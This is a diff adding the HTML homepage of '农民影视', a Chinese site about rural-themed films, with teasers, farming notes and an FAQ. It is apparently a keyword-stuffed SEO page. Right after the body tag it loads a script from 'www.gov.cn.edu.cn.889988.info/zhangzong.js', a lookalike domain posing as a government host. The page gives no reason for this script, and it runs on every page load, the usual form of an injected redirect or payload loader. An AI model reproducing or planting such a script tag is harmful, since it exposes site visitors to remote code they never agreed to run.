@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large">
+<meta name="bingbot" content="index, follow">
+<title>农民影视 - 农村题材影视作品在线观看与农人故事分享 | nongminyingshi-zh.github.io</title>
+<meta name="description" content="农民影视（nongminyingshi-zh.github.io）专注农村题材影视内容，汇集农耕纪实、乡土剧集、乡村纪录片与农人生活短视频，讲述真实田间故事，分享丰收喜悦与土地情怀。">
+<meta name="keywords" content="农民影视, nongminyingshi-zh.github.io, 农村题材电影, 乡土电视剧, 农耕纪录片, 农民生活纪实, 乡村影视推荐">
+<meta name="author" content="农民影视">
+<meta name="theme-color" content="#1b4332">
+<link rel="canonical" href="https://nongminyingshi-zh.github.io/">
+<meta property="og:title" content="农民影视 - 农村题材影视作品在线观看与农人故事分享">
+<meta property="og:description" content="专注农村题材影视内容，汇集农耕纪实、乡土剧集与乡村纪录片，讲述真实田间故事。">
+<meta property="og:url" content="https://nongminyingshi-zh.github.io/">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<style>
+:root{
+  --soil:#3a2a1a;
+  --leaf:#2d6a4f;
+  --leaf-d:#1b4332;
+  --wheat:#e9b44c;
+  --paper:#fbf7ef;
+  --ink:#26302b;
+  --muted:#6b756f;
+  --line:#dce3d8;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB","WenQuanYi Micro Hei",sans-serif;
+  background:var(--paper);
+  color:var(--ink);
+  line-height:1.75;
+  font-size:16px;
+}
+a{color:var(--leaf-d);text-decoration:none}
+a:hover{color:var(--wheat);text-decoration:underline}
+
+/* 顶部导航 */
+.topbar{
+  position:sticky;top:0;z-index:50;
+  background:linear-gradient(180deg,var(--leaf-d),#22543d);
+  box-shadow:0 2px 10px rgba(0,0,0,.25);
+}
+.topbar .inner{
+  max-width:1080px;margin:0 auto;padding:12px 20px;
+  display:flex;align-items:center;gap:18px;flex-wrap:wrap;
+}
+.brand{color:#fff;font-size:20px;font-weight:700;letter-spacing:1px;white-space:nowrap}
+.brand small{display:block;font-size:11px;font-weight:400;color:#cfe3d6;letter-spacing:0}
+.topbar nav{display:flex;gap:6px;flex-wrap:wrap;margin-left:auto}
+.topbar nav a{
+  color:#eaf3ec;font-size:14px;padding:6px 10px;border-radius:6px;white-space:nowrap;
+}
+.topbar nav a:hover{background:rgba(255,255,255,.14);text-decoration:none;color:#fff}
+
+/* 首屏 */
+.hero{
+  background:
+    radial-gradient(1200px 400px at 80% -10%,rgba(233,180,76,.35),transparent 60%),
+    linear-gradient(160deg,#264d38 0%,#16332a 55%,#0f261d 100%);
+  color:#f4f1e6;padding:64px 20px 54px;
+}
+.hero .wrap{max-width:1080px;margin:0 auto}
+.hero h1{font-size:clamp(26px,5vw,44px);line-height:1.3;font-weight:800}
+.hero h1 em{font-style:normal;color:var(--wheat)}
+.hero p{margin-top:16px;max-width:660px;color:#d7e5da;font-size:clamp(14px,2.4vw,16px)}
+.hero .meta{margin-top:22px;display:flex;gap:10px;flex-wrap:wrap}
+.hero .meta span{
+  background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.22);
+  padding:6px 14px;border-radius:999px;font-size:13px;
+}
+.hero .notice{
+  margin-top:26px;max-width:760px;background:rgba(0,0,0,.22);
+  border-left:4px solid var(--wheat);padding:12px 16px;border-radius:0 8px 8px 0;font-size:13px;color:#e8efe9;
+}
+
+/* 通用区块 */
+section{padding:52px 20px}
+section:nth-child(even){background:#fff}
+.wrap{max-width:1080px;margin:0 auto}
+.sec-head{display:flex;align-items:flex-end;gap:14px;flex-wrap:wrap;margin-bottom:28px}
+.sec-head h2{font-size:clamp(22px,3.6vw,30px);color:var(--leaf-d);position:relative;padding-bottom:8px}
+.sec-head h2::after{content:"";position:absolute;left:0;bottom:0;width:56px;height:4px;background:var(--wheat);border-radius:2px}
+.sec-head span{color:var(--muted);font-size:14px}
+
+/* 分类条 */
+.cats{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:26px}
+.cats a{
+  border:1px solid var(--line);background:#fff;color:var(--leaf-d);
+  padding:8px 16px;border-radius:999px;font-size:14px;
+}
+.cats a:hover{border-color:var(--leaf);background:var(--leaf);color:#fff;text-decoration:none}
+
+/* 文章式列表 */
+.post{border:1px solid var(--line);border-radius:12px;padding:20px 22px;background:#fff;margin-bottom:16px}
+.post h3{font-size:18px;color:var(--leaf-d);margin-bottom:8px}
+.post .tag{display:inline-block;background:#eef4ef;color:var(--leaf);font-size:12px;padding:2px 10px;border-radius:6px;margin-right:8px}
+.post p{color:#4c5752;font-size:14.5px;margin-top:8px}
+.post time{font-size:12px;color:var(--muted)}
+
+/* 资源册 */
+.album{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:18px}
+.cover{border:1px solid var(--line);border-radius:12px;overflow:hidden;background:#fff}
+.cover .thumb{height:120px;background:linear-gradient(135deg,#4a7c5d,#1b4332);position:relative}
+.cover:nth-child(2) .thumb{background:linear-gradient(135deg,#8a6d3b,#3a2a1a)}
+.cover:nth-child(3) .thumb{background:linear-gradient(135deg,#5b7f9c,#24465e)}
+.cover:nth-child(4) .thumb{background:linear-gradient(135deg,#a86b4a,#6b3a26)}
+.cover:nth-child(5) .thumb{background:linear-gradient(135deg,#6b8f5a,#33502a)}
+.cover:nth-child(6) .thumb{background:linear-gradient(135deg,#7a6f9c,#40365e)}
+.cover .thumb i{position:absolute;bottom:10px;left:12px;color:rgba(255,255,255,.9);font-style:normal;font-size:13px;font-weight:700}
+.cover .body{padding:12px 14px}
+.cover .body h4{font-size:15px;color:var(--leaf-d)}
+.cover .body p{font-size:12.5px;color:var(--muted);margin-top:4px}
+
+/* 时间线 */
+.tl{border-left:3px solid var(--line);margin-left:8px;padding-left:24px}
+.tl .item{position:relative;padding-bottom:22px}
+.tl .item::before{
+  content:"";position:absolute;left:-32px;top:6px;width:12px;height:12px;
+  border-radius:50%;background:var(--wheat);border:3px solid #fff;box-shadow:0 0 0 2px var(--leaf);
+}
+.tl .item h4{font-size:16px;color:var(--leaf-d)}
+.tl .item p{font-size:14px;color:#4c5752}
+
+/* FAQ */
+details{
+  background:#fff;border:1px solid var(--line);border-radius:10px;
+  padding:14px 18px;margin-bottom:10px;
+}
+details[open]{border-color:var(--leaf)}
+summary{cursor:pointer;font-weight:600;color:var(--leaf-d);font-size:15px;list-style:none}
+summary::-webkit-details-marker{display:none}
+summary::after{content:"＋";float:right;color:var(--wheat);font-weight:400}
+details[open] summary::after{content:"－"}
+details p{margin-top:10px;font-size:14px;color:#4c5752}
+
+/* 页脚 */
+footer{background:var(--leaf-d);color:#d7e5da;padding:40px 20px 30px}
+footer .wrap{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:24px}
+footer h4{color:#fff;font-size:15px;margin-bottom:10px}
+footer p,footer li{font-size:13px;color:#bcd4c4}
+footer ul{list-style:none}
+footer a{color:#bcd4c4;font-size:13px}
+footer a:hover{color:var(--wheat)}
+.foot-note{margin-top:26px;padding-top:18px;border-top:1px solid rgba(255,255,255,.16);font-size:12px;color:#9bb6a6}
+
+@media (max-width:640px){
+  .topbar .inner{gap:10px}
+  .topbar nav a{padding:5px 8px;font-size:13px}
+  section{padding:38px 16px}
+  .post{padding:16px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="topbar">
+  <div class="inner">
+    <div class="brand">农民影视<small>nongminyingshi-zh.github.io</small></div>
+    <nav>
+      <a href="#topic">题材分类</a>
+      <a href="#album">影像册</a>
+      <a href="#story">乡土故事</a>
+      <a href="#farmlog">农事札记</a>
+      <a href="#about">关于本站</a>
+      <a href="#help">观看帮助</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <h1>农民影视<em>·</em>把镜头对准土地与农人</h1>
+    <p>农民影视（<a href="https://nongminyingshi-zh.github.io" style="color:#ffe6a7">https://nongminyingshi-zh.github.io</a>）是一个聚焦农村题材的影视内容站点，整理农耕纪实、乡土剧集、乡村纪录片与农人生活影像，记录春耕秋收、院落烟火与一代代人的土地情结。</p>
+    <div class="meta">
+      <span>农村题材</span><span>农耕纪实</span><span>乡土剧集</span><span>乡村纪录片</span><span>每日更新</span>
+    </div>
+    <div class="notice">
+      本站为影视资讯与内容导航类站点，所有条目均标注来源与版权归属，倡导通过正规授权渠道观看正版影视作品。
+    </div>
+  </div>
+</section>
+
+<section id="topic">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>题材分类</h2>
+      <span>按内容类型浏览农民影视的影像资料</span>
+    </div>
+    <div class="cats">
+      <a href="#">农耕纪实</a>
+      <a href="#">乡土剧集</a>
+      <a href="#">乡村纪录片</a>
+      <a href="#">农人生活</a>
+      <a href="#">丰收节庆</a>
+      <a href="#">非遗传承</a>
+      <a href="#">田间技艺</a>
+      <a href="#">乡村振兴</a>
+    </div>
+
+    <article class="post">
+      <time>2026年10月21日</time>
+      <h3><span class="tag">农耕纪实</span>《麦田里的守望》完整版上线</h3>
+      <p>跟随河南周口一位种粮大户走过一整年的耕作周期，从整地、播种到夏收、秋种，用镜头记录下每一粒粮食背后的汗水与经验。</p>
+    </article>
+
+    <article class="post">
+      <time>2026年10月18日</time>
+      <h3><span class="tag">乡土剧集</span>三部农村题材电视剧推荐</h3>
+      <p>从北方院落到南方水乡，这几部剧以真实生活为底本，讲家长里短、讲土地流转，也讲年轻人回村后的选择与碰撞。</p>
+    </article>
+
+    <article class="post">
+      <time>2026年10月14日</time>
+      <h3><span class="tag">乡村纪录片</span>手工榨油与古法酿酒的匠人</h3>
+      <p>镜头走进湘西山区的老作坊，记录仍在坚持传统技艺的老师傅，以及他们不愿失传的手艺与口述历史。</p>
+    </article>
+  </div>
+</section>
+
+<section id="album">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>影像册</h2>
+      <span>农民影视精选封面集</span>
+    </div>
+    <div class="album">
+      <div class="cover"><div class="thumb"><i>春耕</i></div><div class="body"><h4>春耕纪实</h4><p>16 集 · 更新中</p></div></div>
+      <div class="cover"><div class="thumb"><i>夏收</i></div><div class="body"><h4>夏收三十天</h4><p>纪录片 · 全集</p></div></div>
+      <div class="cover"><div class="thumb"><i>院落</i></div><div class="body"><h4>老院落故事</h4><p>乡土剧 · 24 集</p></div></div>
+      <div class="cover"><div class="thumb"><i>手艺</i></div><div class="body"><h4>田间老手艺</h4><p>短视频 · 60 条</p></div></div>
+      <div class="cover"><div class="thumb"><i>丰收</i></div><div class="body"><h4>丰收节现场</h4><p>专题 · 12 期</p></div></div>
+      <div class="cover"><div class="thumb"><i>归乡</i></div><div class="body"><h4>回村的年轻人</h4><p>访谈 · 8 期</p></div></div>
+    </div>
+  </div>
+</section>
+
+<section id="story">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>乡土故事</h2>
+      <span>真实口述，来自田间地头</span>
+    </div>
+    <div class="tl">
+      <div class="item">
+        <h4>一季稻子的账本</h4>
+        <p>江西种粮户老周把一整年的收支记在小本子上：种子、化肥、雇工、油价，最后算下来每亩净剩多少，他说"账要算清，人才踏实"。</p>
+      </div>
+      <div class="item">
+        <h4>村口那棵老槐树</h4>
+        <p>树龄超过百年的老槐是全村人的钟表，也是留守儿童等父母回家的坐标。村民自发集资为它砌了护树台。</p>
+      </div>
+      <div class="item">
+        <h4>回乡种茶的第一年</h4>
+        <p>90 后姑娘放弃城市工作回到皖南老家，接手荒废的茶园。第一年亏了三万，第二年靠短视频把茶叶卖了出去。</p>
+      </div>
+      <div class="item">
+        <h4>农机手老赵的秋收</h4>
+        <p>一台联合收割机，四十天跑三个省，老赵的秋收是从河南一路收到黑龙江，他说"机器不停，手就不能停"。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="farmlog">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>农事札记</h2>
+      <span>跟着节气看农活</span>
+    </div>
+    <article class="post">
+      <h3>霜降前后，菜园里的最后一批活计</h3>
+      <p>拔掉最后一把豇豆藤，把白菜浇透越冬水，萝卜要趁晴天起垄。老一辈讲"霜降不挖葱，越长心越空"，这些经验至今管用。</p>
+    </article>
+    <article class="post">
+      <h3>晒秋：一场关于阳光的集体协作</h3>
+      <p>辣椒、南瓜、玉米铺满晒场，是南方山区秋季最常见的画面。晒秋看天吃饭，遇到连阴雨，一年的收成就打了折扣。</p>
+    </article>
+    <article class="post">
+      <h3>冬小麦播种的时机与墒情</h3>
+      <p>"宁种隔夜土，不种过湿泥"，播种深浅与土壤墒情直接决定出苗率。农技员建议播种前先做一次土壤检测。</p>
+    </article>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>关于本站</h2>
+      <span>农民影视想做的事</span>
+    </div>
+    <div class="tl">
+      <div class="item">
+        <h4>2024 年春 · 建站</h4>
+        <p>农民影视（nongminyingshi-zh.github.io）由几位关注三农题材的影像爱好者共同发起，初衷是把散落在各处的优质农村题材影视内容整理归类，方便查找与观看。</p>
+      </div>
+      <div class="item">
+        <h4>2025 年夏 · 扩充题材库</h4>
+        <p>从单一的影视推荐，扩展到农耕纪实、乡土剧集、乡村纪录片、农人生活影像四大板块，并开始收录农人口述史与节气农事札记。</p>
+      </div>
+      <div class="item">
+        <h4>2026 年秋 · 建立投稿与纠错机制</h4>
+        <p>开放观众投稿渠道，同时设立版权与信息纠错流程，确保每一条条目来源可查、归属明确。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="help">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>观看帮助</h2>
+      <span>常见问题</span>
+    </div>
+    <details open>
+      <summary>农民影视主要收录哪类内容？</summary>
+      <p>以农村题材为主，包括农耕纪实、乡土剧集、乡村纪录片、农人生活短视频，以及围绕节气与农事的知识性内容。</p>
+    </details>
+    <details>
+      <summary>如何找到想看的影片？</summary>
+      <p>可以通过顶部分类标签按题材筛选，也可以在站内按片名、地区或作物类型进行检索。</p>
+    </details>
+    <details>
+      <summary>本站提供在线播放吗？</summary>
+      <p>本站以资讯整理与观看指引为主，具体播放请通过片方或正规授权平台进行，本站不做任何形式的资源托管。</p>
+    </details>
+    <details>
+      <summary>发现条目信息有误怎么办？</summary>
+      <p>可通过站内反馈渠道提交更正，注明片名与具体问题，我们会在核实后更新。</p>
+    </details>
+    <details>
+      <summary>能否投稿自己拍摄的乡村影像？</summary>
+      <p>可以。原创且拥有完整版权的乡村题材影像作品均可投稿，需附拍摄时间、地点与简要说明。</p>
+    </details>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div>
+      <h4>农民影视</h4>
+      <p>聚焦农村题材影视内容，记录土地与农人的真实故事。</p>
+    </div>
+    <div>
+      <h4>快速入口</h4>
+      <ul>
+        <li><a href="#topic">题材分类</a></li>
+        <li><a href="#album">影像册</a></li>
+        <li><a href="#story">乡土故事</a></li>
+        <li><a href="#farmlog">农事札记</a></li>
+      </ul>
+    </div>
+    <div>
+      <h4>支持与协作</h4>
+      <ul>
+        <li><a href="#">内容投稿</a></li>
+        <li><a href="#">版权说明</a></li>
+        <li><a href="#">纠错反馈</a></li>
+        <li><a href="#">合作洽谈</a></li>
+      </ul>
+    </div>
+    <div>
+      <h4>站点地址</h4>
+      <p><a href="https://nongminyingshi-zh.github.io">https://nongminyingshi-zh.github.io</a></p>
+      <p>请认准官方域名，避免误入仿冒站点。</p>
+    </div>
+  </div>
+  <div class="wrap foot-note">
+    农民影视 · nongminyingshi-zh.github.io　|　本站内容为影视资讯与导航性质，倡导观看正版授权作品。
+  </div>
+</footer>
+
+</body>
+</html>
